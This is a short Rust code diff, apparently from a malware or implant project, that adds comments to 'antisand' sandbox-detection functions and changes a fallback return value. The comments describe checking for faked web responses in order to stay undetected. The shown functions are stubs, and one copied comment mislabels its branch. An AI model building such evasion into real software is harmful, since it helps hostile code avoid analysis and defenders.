@@ -25,6 +25,10 @@ pub fn xor_encrypt_decrypt(key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn E
     xor_u8_slices(key, text)
 }
 
+/*
+    Antisand Windows implementation - basically looks to see if something fakes a response to a website
+*/
+
 #[cfg(all(windows, feature = "antisand"))]
 use std::mem;
 #[cfg(all(windows, feature = "antisand"))]
@@ -53,12 +57,20 @@ pub fn pound_sand() -> bool {
     false
 }
 
+/*
+    Antisand Linux implementation - since I currently don't need to do this to remain undetected it's a dummy (does nothing)
+*/
+
 #[cfg(all(target_os = "linux", feature = "antisand"))]
 pub fn pound_sand() -> bool {
     false
 }
 
+/*
+    Antisand Linux implementation - since I currently don't need to do this to remain undetected it's a dummy (does nothing)
+*/
+
 #[cfg(not(feature = "antisand"))]
 pub fn pound_sand() -> bool {
-    true
+    false
 }
